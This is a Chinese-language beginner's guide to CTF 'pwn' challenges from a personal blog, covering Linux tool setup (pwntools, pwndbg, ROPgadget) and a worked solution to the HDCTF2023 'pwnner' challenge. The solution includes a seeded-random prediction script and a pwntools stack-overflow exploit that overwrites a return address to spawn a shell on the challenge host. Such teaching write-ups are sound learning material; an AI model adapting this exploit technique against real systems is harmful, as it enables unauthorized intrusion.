<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>pwn入门指北 | str1k3</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>pwn入门指北</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-07-01T16:56:01.000Z" id="date"> 2023-07-01</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-08-28T09:40:56.544Z" id="updated"> 2023-08-28</time></div></span></div></div><hr><div id="post-content"><p><em>To all begin pwnner</em></p>
<p><strong>什么是Pwn</strong><br>    “Pwn”是一个拟声词，代表着攻破，获取权限，由”own”一次引申而来。在CTF比赛中，一道pwn题通常会给解题者提供二进制文件，一个靶机。解题者需要通过对二进制文件进行逆向分析，找到其中的漏洞并对漏洞加以利用，最终实现对靶机的提权（简单pwn题的解题详见真.入门之一道pwn题）。</p>
<p><strong>学Pwn能学到什么</strong><br>    1.亿点点的逆向工程。大部分Pwn题都要求先对二进制文件进行逆向分析，掌握一定的逆向技巧是必不可少的。同CTF中的reverse侧重于算法稍有不同，Pwn题的逆向侧重于漏洞的发现与利用。<br>   2.C语言与汇编语言以及python。阅读二进制文件反汇编出的汇编代码与反编译后的伪代码需要有一定的C语言与汇编语言基础。漏洞利用所常用的pwntools库的使用需要一丢丢的python编程基础。<br>    3.数据结构与操作系统。CTF中的Pwn题一般涉及栈溢出、堆溢出等漏洞，要求解题者对数据结构有比较深的理解。同时，由于Pwn靶机一般是Linux系统的靶机，二进制文件也在Linux环境下编译运行，因此，学会熟练使用、深入理解Linux系统是每个Pwn解题者的必修课。<br><strong>学Pwn需要有的心理准备</strong><br>    1.自学拉满：本队伍没有强Pwn手，手把手教学什么的应该没有。Pwn涉及的计算机底层知识较多，需要你深入学习并理解。<br>    2.坐牢准备：Pwn所需的前置知识比较多，0基础入门者可能很久都解不了什么题<br>    3.做好准备跟真正的爷爷竞争。</p>
<p><strong>真.入门之环境配置</strong><br>如果你准备好踏入Pwn的大门，我们先从环境配置开始吧<br>    <a target="_blank" rel="noopener" href="https://mirrors.tuna.tsinghua.edu.cn/">https://mirrors.tuna.tsinghua.edu.cn/</a><br>    在这里找个纯净的Ubuntu镜像文件，18.04到22.04之间的都可以（建议不要用kali，用来做过渡可以，但是会有些问题；22.04以上太新，也会有问题。存储空间富有者当我没说），先搭建起自己的虚拟机吧。<br>    这里说说原因哈，python的pwntools在Windows环境下运行会有些问题，此外当你自己研究时也需要用到Linux环境。<br>    <a target="_blank" rel="noopener" href="https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/%E7%9C%8B%E8%BF%99%E9%87%8C%E6%8D%A2%E6%BA%90">https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/看这里换源</a><br>更新</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt update &amp;&amp;sudo apt upgrade -y<br>sudo apt install python3<br></code></pre></td></tr></table></figure>
<p>（ps：以下安装过程中会下载所需的依赖，比较吃网络环境，如果不成功可以多试几次）<br>装pip</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install pip<br></code></pre></td></tr></table></figure>
<p>装pwntools，这个库非常有用，是你的左膀右臂（很重要，最好有时间能精读它的手册）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install pwntools<br></code></pre></td></tr></table></figure>
<p>装git，这个用来下github上的东西</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install git<br></code></pre></td></tr></table></figure>
<p>装pwndbg，这个是gdb的插件，在调试方面能给你很大帮助（调试方法请自学，很重要）<br>先装四个库不然会报错（主要是linux下64位和32位的环境）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get install libffi-dev<br>sudo apt-get install libssl-dev<br>sudo apt install libc6-dev-i386<br>sudo apt-get install lib32z1<br><span class="hljs-built_in">cd</span> Desktop<br>git <span class="hljs-built_in">clone</span> https://github.com/pwndbg/pwndbg<br><span class="hljs-built_in">cd</span> pwndbg<br>./setup.sh<br><span class="hljs-built_in">cd</span> ..<br></code></pre></td></tr></table></figure>
<p>装ROPgadget，这个工具能帮你找到二进制文件中可用的gadget，也可以直接对静态编译的二进制文件生成ROP链</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get install python-capstone<br>git <span class="hljs-built_in">clone</span> https://github.com/JonathanSalwan/ROPgadget.git<br><span class="hljs-built_in">cd</span> ROPgadget<br>sudo -H python3 setup.py install<br></code></pre></td></tr></table></figure>
<p>one_gadget，这个工具能帮你找到一些危险的可以加以利用的汇编片段</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get install ruby ruby-dev<br>sudo gem install one_gadget<br></code></pre></td></tr></table></figure>

<p><strong>真.入门之一道pwn题</strong><br>以下是一道pwn题，不是最简单的，但是很好地展现了pwn手解题的过程，因此放在这里<br><em>【HDCTF2023】pwnner</em><br>考点：已知种子随机数预测+简单栈溢出覆盖返回地址<br>查个保护先</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(str1d3r㉿str1k3Gwindows)-[~/Desktop]<br>└─$ checksec pwnner<br>[*] <span class="hljs-string">&#x27;/Desktop/pwnner&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br>```  <br><br>开了NX，不能直接在栈上执行shellcode（各类保护是需要知道的）<br><br>进IDA，看vuln函数，F5反编译，发现需要经过一次输入随机数的判断才能到达漏洞执行处，由于程序给了随机数种子（伪随机），我们可以通过直接在本地生成一个随机数来通过验证，到达漏洞所在处完成利用<br><br>```c<br>__int64 <span class="hljs-function"><span class="hljs-title">vuln</span></span>()<br>&#123;<br>  int v0; // ebx<br>  char buf[16]; // [rsp+0h] [rbp-50h] BYREF<br>  char v3[64]; // [rsp+10h] [rbp-40h] BYREF<br><br>  srand(0x39u); //种子为0x39的随机数生成<br>  puts(<span class="hljs-string">&quot;you should prove that you love pwn,so input your name:&quot;</span>);<br>  <span class="hljs-built_in">read</span>(0, buf, 0x10uLL); //存在溢出<br>  v0 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v0 == rand() )<br>  &#123;<br>    puts(<span class="hljs-string">&quot;ok,you have a little cognition about pwn,so what will you do next?&quot;</span>);<br>    <span class="hljs-built_in">read</span>(0, v3, 0x100uLL);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    puts(<span class="hljs-string">&quot;sorry,you are not a real pwnner&quot;</span>);<br>  &#125;<br>  <span class="hljs-built_in">return</span> 0LL;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>又发现：<br>getshell函数内直接有system(‘&#x2F;bin&#x2F;sh’),所以思路如下<br>先通过随机数预测，再利用溢出点覆盖函数返回地址，跳到getshell函数成功getshell<br>随机数预测脚本：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>        <br>        srand(<span class="hljs-number">0x39</span>u);<br>        <span class="hljs-type">int</span> v4 = rand();<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d, &quot;</span>,v4);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>注意的是因为靶机也是Linux系统，所以该脚本需要由Linux系统编译运行<br>直接贴脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*       <span class="hljs-comment">#引入pwntools库</span><br>elf=ELF(<span class="hljs-string">&#x27;./pwnner&#x27;</span>)  <br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span> <span class="hljs-comment">#这个能看到回显</span><br>p = remote(<span class="hljs-string">&#x27;node1.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">28090</span>)<span class="hljs-comment">#链接靶机</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;you should prove that you love pwn,so input your name:&#x27;</span>)<br>p.send(<span class="hljs-string">b&#x27;1956681178&#x27;</span>) <span class="hljs-comment">#通过随机数检验</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">64</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x4008b2</span>)<br><span class="hljs-comment">#填充垃圾数据，覆盖8位的返回地址，再跳转到getshell函数获得shell</span><br>p.send(payload)    <span class="hljs-comment">#发送payload</span><br>p.interactive()    <span class="hljs-comment">#交互</span><br></code></pre></td></tr></table></figure>
<p>成功拿到shell</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-start"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/07/20/GDOUCTF2023-pwn/">← Next GDOUCTF2023_pwn</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/1.png" alt="Logo"></a><h1 id="Dr"><a target="_blank" rel="noopener" href="https://str1ke4fun.github.io/">str1k3</a></h1><div id="description"><p></p></div></div><div id="aside-block"></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>